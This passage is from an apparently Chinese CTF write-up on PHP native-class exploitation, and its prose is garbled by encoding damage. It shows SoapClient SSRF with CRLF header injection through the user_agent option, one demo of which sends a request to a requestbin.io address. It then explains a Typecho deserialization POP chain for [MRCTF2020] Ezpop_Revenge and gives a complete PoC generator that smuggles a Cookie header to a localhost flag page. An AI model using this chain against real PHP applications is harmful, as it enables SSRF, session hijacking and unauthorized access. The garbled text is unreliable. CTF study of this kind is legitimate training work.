ä¸º<code>Content-Type</code>åœ¨<code>User-Agent</code>çš„ä¸‹é¢,æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡æ›´æ”¹<code>User-Agent</code>çš„å€¼æ¥æ›¿æ¢æ‰åŸæ¥çš„<code>Content-Type</code>çš„å€¼</p><p><strong>test3.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;https://requestbin.io/12lhej01&#x27;</span>;</span><br><span class="line"><span class="variable">$data</span> = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=test&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;Test^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>. (<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$data</span>,<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;test&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041126754.png" alt="image-20221004112610648"></p><h3 id="MRCTF2020-Ezpop-Revenge"><a href="#MRCTF2020-Ezpop-Revenge" class="headerlink" title="[MRCTF2020]Ezpop_Revenge"></a>[MRCTF2020]Ezpop_Revenge</h3><p>æ‰“å¼€é¢˜ç›®ï¼Œæ˜¯ä¸€ä¸ªTypechoå†™çš„é¡µé¢ï¼Œdirsearchæ‰«å‡º<a href="http://www.zip/">www.zip</a></p><p><strong>flag.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>)) <span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;flag&#x27;</span>]= <span class="string">&quot;MRCTF&#123;******&#125;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;æˆ‘æ‰Œyour problem?\nonly localhost can get flag!&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾çš„è¿™æ˜¯ä¸ªssrf+ååºåˆ—åŒ–çš„é¢˜ç›®ï¼Œæ‰€ä»¥æƒ³åˆ°åˆ©ç”¨<code>SoapClient</code>ç±»æ¥å®ç°<code>ssrf</code>ï¼Œå½“è®¿é—®åï¼Œä¼šæŠŠ<code>flag</code>å†™è¿›è®¿é—®çš„<code>session</code>ä¸­</p><p>åœ¨<code>usr\plugins\HelloWorld\Plugin.php</code>ä¸­æ‰¾åˆ°è§¦å‘ç‚¹</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041205415.png" alt="image-20221004120549336"></p><p>å¦‚æœå­˜åœ¨<code>$_REQUEST[&#39;admin&#39;]</code>ï¼Œå°±ä¼šæ‰“å°å‡ºsessionï¼Œæ­£å¥½flagå°±åœ¨sessionä¸­ï¼ŒåŒæ—¶å°†å¯¹ä¼ å…¥çš„<code>Coincid3nc3</code>å‚æ•°è¿›è¡Œååºåˆ—åŒ–</p><p>åŒæ ·åœ¨Plugin.phpä¸­</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041207290.png" alt="image-20221004120740237"></p><p>åœ¨HelloWorld_DBç±»ä¸­å‘ç°äº†<code>__wakeup</code>é­”æœ¯æ–¹æ³•,åœ¨<code>__wakeup()</code>æ–¹æ³•å†…å®ä¾‹åŒ–äº†<code>Typecho_Db</code>ç±»</p><p>è·Ÿè¿›åˆ°<code>/var/Typecho/Db.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$adapterName</span>, <span class="variable">$prefix</span> = <span class="string">&#x27;typecho_&#x27;</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="comment">/** è·å–é€‚é…å™¨åç§° */</span></span><br><span class="line">      <span class="variable language_">$this</span>-&gt;_adapterName = <span class="variable">$adapterName</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/** æ•°æ®åº“é€‚é…å™¨ */</span></span><br><span class="line">      <span class="variable">$adapterName</span> = <span class="string">&#x27;Typecho_Db_Adapter_&#x27;</span> . <span class="variable">$adapterName</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!<span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>(<span class="variable">$adapterName</span>, <span class="string">&#x27;isAvailable&#x27;</span>))) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Typecho_Db_Exception</span>(<span class="string">&quot;Adapter <span class="subst">&#123;$adapterName&#125;</span> is not available&quot;</span>);<span class="comment">//__toString()</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="variable language_">$this</span>-&gt;_prefix = <span class="variable">$prefix</span>;f</span><br><span class="line"></span><br><span class="line">      <span class="comment">/** åˆå§‹åŒ–å†…éƒ¨å˜é‡ */</span></span><br><span class="line">      <span class="variable language_">$this</span>-&gt;_pool = <span class="keyword">array</span>();</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;_connectedPool = <span class="keyword">array</span>();</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;_config = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">      <span class="comment">//å®ä¾‹åŒ–é€‚é…å™¨å¯¹è±¡</span></span><br><span class="line">      <span class="variable language_">$this</span>-&gt;_adapter = <span class="keyword">new</span> <span class="variable">$adapterName</span>();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­$adapterNameè¢«å½“æˆå­—ç¬¦ä¸²æ‹¼æ¥ï¼Œå°±ä¼šè§¦å‘<code>__toString</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">this-&gt;_adapterName = <span class="variable">$adapterName</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** æ•°æ®åº“é€‚é…å™¨ */</span></span><br><span class="line"><span class="variable">$adapterName</span> = <span class="string">&#x27;Typecho_Db_Adapter_&#x27;</span> . <span class="variable">$adapterName</span>;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__toString()å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œå­—ç¬¦ä¸²å¯¹å¾…çš„æ—¶å€™ï¼Œä¼šè§¦å‘è¿™ä¸ªé­”æœ¯æ–¹æ³•</span><br></pre></td></tr></table></figure><p>å…¨å±€æœç´¢<code>__toString</code>ï¼Œè·Ÿè¿›åˆ°<code>/var/Typecho/Db/Query.php</code></p><p>å…¶ä¸­æœ‰ç”¨çš„éƒ¨åˆ†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_sqlPreBuild</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_adapter</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;action&#x27;</span>]) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="title class_">Typecho_Db</span>::<span class="variable constant_">SELECT</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;_adapter-&gt;<span class="title function_ invoke__">parseSelect</span>(<span class="variable">$this</span>-&gt;_sqlPreBuild);</span><br><span class="line">            <span class="keyword">case</span> <span class="title class_">Typecho_Db</span>::<span class="variable constant_">INSERT</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;INSERT INTO &#x27;</span></span><br><span class="line">                . <span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>]</span><br><span class="line">                . <span class="string">&#x27;(&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27; , &#x27;</span>, <span class="title function_ invoke__">array_keys</span>(<span class="variable">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) . <span class="string">&#x27;)&#x27;</span></span><br><span class="line">                . <span class="string">&#x27; VALUES &#x27;</span></span><br><span class="line">                . <span class="string">&#x27;(&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27; , &#x27;</span>, <span class="title function_ invoke__">array_values</span>(<span class="variable">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) . <span class="string">&#x27;)&#x27;</span></span><br><span class="line">                . <span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;limit&#x27;</span>];</span><br><span class="line">            <span class="keyword">case</span> <span class="title class_">Typecho_Db</span>::<span class="variable constant_">DELETE</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;DELETE FROM &#x27;</span></span><br><span class="line">                . <span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>]</span><br><span class="line">                . <span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;where&#x27;</span>];</span><br><span class="line">            <span class="keyword">case</span> <span class="title class_">Typecho_Db</span>::<span class="variable constant_">UPDATE</span>:</span><br><span class="line">                <span class="variable">$columns</span> = <span class="keyword">array</span>();</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>] <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">                        <span class="variable">$columns</span>[] = <span class="string">&quot;<span class="subst">$key</span> = <span class="subst">$val</span>&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;UPDATE &#x27;</span></span><br><span class="line">                . <span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>]</span><br><span class="line">                . <span class="string">&#x27; SET &#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27; , &#x27;</span>, <span class="variable">$columns</span>)</span><br><span class="line">                . <span class="variable language_">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;where&#x27;</span>];</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­<code>case Typecho_Db::SELECT=SELECT</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">const</span> <span class="variable constant_">DELETE</span> = <span class="string">&#x27;DELETE&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥å¦‚æœä»¤<code>$this-&gt;_sqlPreBuild[&#39;action&#39;]</code>ä¸ºSELECTï¼Œå°±èƒ½æ‰§è¡Œ<code>return $this-&gt;_adapter-&gt;parseSelect($this-&gt;_sqlPreBuild);</code>ï¼Œä¹Ÿå°±æ˜¯è°ƒç”¨<code>$this-&gt;_adapter</code>çš„<code>parseSelect()</code>æ–¹æ³•ï¼Œæ­¤æ—¶ï¼Œä»¤<code>$this-&gt;_adapter</code>ä¸º<strong>SoapClient</strong>ç±»ï¼Œç”±äºSoapClientç±»ä¸­æ²¡æœ‰parseSelect()æ–¹æ³•ï¼Œå°±èƒ½è§¦å‘äº†<code>SoapClient</code>çš„<code>__call()</code>é­”æœ¯æ–¹æ³•ï¼Œè€Œ<code>__call()</code>æ­£æ˜¯å®ç°SSRFçš„å…³é”®ï¼Œå…³äº<code>SoapClient</code>ç±»å®ç°ssrf</p><p>æ‰€ä»¥æ•´ä½“æ€è·¯å°±æœ‰äº†</p><h4 id="POPé“¾"><a href="#POPé“¾" class="headerlink" title="POPé“¾"></a>POPé“¾</h4><p>1ã€è¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™ï¼Œå°±ä¼šè§¦å‘<code>__wakeup</code>é­”æœ¯æ–¹æ³•ï¼Œåœ¨<code>__wakeup</code>æ–¹æ³•é‡Œå®ä¾‹åŒ–äº†<code>Typecho_Db</code>ç±»</p><p>2ã€<code>Typecho_Db</code>ç±»ä¸­å°†ä¸€ä¸ªå¯¹è±¡å½“ä½œå­—ç¬¦ä¸²æ‹¼æ¥è§¦å‘äº†<code>__toString</code>é­”æœ¯æ–¹æ³•</p><p>3ã€åœ¨<code>__toString()</code>å†…ï¼Œå¦‚æœä»¤<code>$_sqlPreBuild[&#39;action&#39;]</code>ä¸º<code>SELECT</code>å°±ä¼šè§¦å‘<code>$_adapter</code>çš„<code>parseSelect()</code>æ–¹æ³•</p><p>4ã€ä»¤<code>$_adapter</code>ä¸º<code>SoapClient</code>ç±»ï¼Œç”±äºSoapClientç±»ä¸­æ²¡æœ‰parseSelect()æ–¹æ³•ï¼Œå°±ä¼šè§¦å‘<code>SoapClient</code>çš„<code>__call()</code>é­”æœ¯æ–¹æ³•ï¼Œå®ç°ssrf</p><h4 id="è°ƒç”¨ç‚¹"><a href="#è°ƒç”¨ç‚¹" class="headerlink" title="è°ƒç”¨ç‚¹"></a>è°ƒç”¨ç‚¹</h4><p>åœ¨<code>/var/Typecho/Plugin.php</code>ä¸­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">activate</span>(<span class="params"><span class="variable">$pluginName</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">self</span>::<span class="variable">$_plugins</span>[<span class="string">&#x27;activated&#x27;</span>][<span class="variable">$pluginName</span>] = <span class="built_in">self</span>::<span class="variable">$_tmp</span>;</span><br><span class="line">    <span class="built_in">self</span>::<span class="variable">$_tmp</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="title class_">Helper</span>::<span class="title function_ invoke__">addRoute</span>(<span class="string">&quot;page_admin_action&quot;</span>,<span class="string">&quot;/page_admin&quot;</span>,<span class="string">&quot;HelloWorld_Plugin&quot;</span>,<span class="string">&#x27;action&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è®¿é—®<code>/page_admin</code>çš„æ—¶å€™ï¼Œä¼šè‡ªåŠ¨åŠ è½½<code>HelloWorld_Plugin</code>ç±»ï¼Œè€Œä¸”ä¼šè‡ªåŠ¨è°ƒç”¨<code>action</code>å‡½æ•°</p><h4 id="expè§£æ"><a href="#expè§£æ" class="headerlink" title="expè§£æ"></a>expè§£æ</h4><p><strong>POC</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_sqlPreBuild</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_adapter</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$target</span> = <span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span>;</span><br><span class="line">        <span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Cookie: PHPSESSID=a86167abe7j6mjojp3o5dvkn47&#x27;</span></span><br><span class="line">        );</span><br><span class="line">        <span class="variable">$z</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>, <span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>, <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&#x27;aaa^^&#x27;</span> . <span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>, <span class="variable">$headers</span>), <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&quot;aaab&quot;</span>));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_sqlPreBuild = <span class="keyword">array</span>(<span class="string">&quot;action&quot;</span> =&gt; <span class="string">&quot;SELECT&quot;</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_adapter = <span class="variable">$z</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$coincidence</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;coincidence = [<span class="string">&quot;hello&quot;</span> =&gt; <span class="keyword">new</span> <span class="title class_">Typecho_Db_Query</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä¸‹é¢è¿™ä¸ªæ›¿æ¢å‡½æ•°ä¸çŸ¥é“æ˜¯æ¥è‡ªå“ªä¸ªå¸ˆå‚…çš„</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decorate</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$arr</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;:&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">    <span class="variable">$newstr</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/00/&#x27;</span>, <span class="variable">$arr</span>[<span class="variable">$i</span>])) &#123;</span><br><span class="line">            <span class="variable">$arr</span>[<span class="variable">$i</span> - <span class="number">2</span>] = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/s/&#x27;</span>, <span class="string">&quot;S&quot;</span>, <span class="variable">$arr</span>[<span class="variable">$i</span> - <span class="number">2</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>) - <span class="number">1</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$newstr</span> .= <span class="variable">$arr</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$newstr</span> .= <span class="string">&quot;:&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$newstr</span> .= <span class="variable">$arr</span>[<span class="variable">$i</span>];</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$newstr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">HelloWorld</span>_DB();</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot; /\^\^/&quot;</span>, <span class="string">&quot;\r\n&quot;</span>, <span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$d</span> = <span class="title function_ invoke__">urlencode</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$e</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/%00/&#x27;</span>, <span class="string">&#x27;%5c%30%30&#x27;</span>, <span class="variable">$d</span>);</span><br><span class="line"><span class="variable">$f</span> = <span class="title function_ invoke__">decorate</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$e</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$f</span>);</span><br></pre></td></tr></table></figure><p><strong>1.å°†å°å†™çš„sæ¢æˆå¤§å†™çš„Sï¼Œå¹¶æ·»åŠ \00</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">è¿™æ˜¯å› ä¸ºprivateå±æ€§ä¼šåœ¨ååºåˆ—åŒ–çš„ç”Ÿæˆä¸€ä¸ªæ ‡å¿—æ€§çš„%00</span><br><span class="line">1.PHPåœ¨åºåˆ—åŒ–æ—¶å±æ€§ä¸ºprivateå’Œprotectedçš„å˜é‡ä¼šå¼•å…¥ä¸å¯è§å­—ç¬¦\x00ï¼Œè€Œåœ¨è¾“å‡ºå’Œå¤åˆ¶çš„æ—¶å€™å¯èƒ½ä¼šé—å¤±è¿™äº›ä¿¡æ¯ï¼Œå¯¼è‡´ååºåˆ—åŒ–çš„æ—¶å€™å‡ºç°é”™è¯¯ã€‚</span><br><span class="line">2.privateå±æ€§åºåˆ—åŒ–çš„æ—¶å€™ä¼šå¼•å…¥ä¸¤ä¸ª\x00ï¼Œè¿™ä¸¤ä¸ª\x00å°±æ˜¯asciiç ä¸º0çš„å­—ç¬¦ã€‚è¿™ä¸ªå­—ç¬¦æ˜¾ç¤ºå’Œè¾“å‡ºå¯èƒ½çœ‹ä¸åˆ°ï¼Œç”šè‡³ä¼šå¯¼è‡´æˆªæ–­ï¼Œprotectedå±æ€§ä¼šå¼•å…¥\x00*\x00ã€‚</span><br><span class="line">3.åœ¨åºåˆ—åŒ–å†…å®¹ä¸­ç”¨å¤§å†™Sè¡¨ç¤ºå­—ç¬¦ä¸²ï¼Œæ­¤æ—¶è¿™ä¸ªå­—ç¬¦ä¸²å°±æ”¯æŒå°†åé¢çš„å­—ç¬¦ä¸²ç”¨16è¿›åˆ¶è¡¨ç¤ºã€‚</span><br></pre></td></tr></table></figure><p><strong>2.æ·»åŠ <code>\r\n</code>ï¼Œbase64ç¼–ç </strong></p><p>å› ä¸ºæƒ³è¦å¸¦SESSIONå‡ºæ¥ï¼Œå¿…é¡»è¦æŠŠè‡ªå·±çš„PHPSESSIDä¼ è¿‡å»ï¼Œç„¶è€ŒSOAPå¹¶ä¸èƒ½è®¾ç½®Cookieï¼Œå› æ­¤éœ€è¦<strong>CRLF</strong>ã€‚SoapClientå¯ä»¥è®¾ç½®UAï¼Œæ‰€ä»¥åœ¨UAååŠ ä¸Š\r\nCookie: PHPSESSID&#x3D;xxxå°±èƒ½æ·»åŠ ä¸€ä¸ªCookieï¼Œå°±èƒ½å¸¦ä¸Šsession.<br>è‡ªå·±çš„PHPSESSIDå°±æ˜¯è®¿é—®<code>/page_admin</code>å¾—åˆ°çš„</p><p>ç”Ÿæˆpocåï¼Œåœ¨<code>/page_admin</code>å¤„POSTæˆ‘ä»¬POCç”Ÿæˆçš„payload</p><p>å°±èƒ½åˆ©ç”¨soapç±»å»è®¿é—®flag.phpä»è€Œå®ç°SSRFæŠŠflagå¸¦åˆ°sessionä¸­ï¼Œæœ€åå¸¦ä¸Šadminå‚æ•°å¹¶å°†sessionæ›¿æ¢æˆè‡ªå·±çš„PHPSESIONå³å¯å¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041232981.png" alt="image-20221004123207895"></p>]]></content>
      
      
      <categories>
          
          <category> phpåŸç”Ÿç±» </category>
          
      </categories>
      
      
        <tags>
            
            <tag> phpåŸç”Ÿç±» </tag>
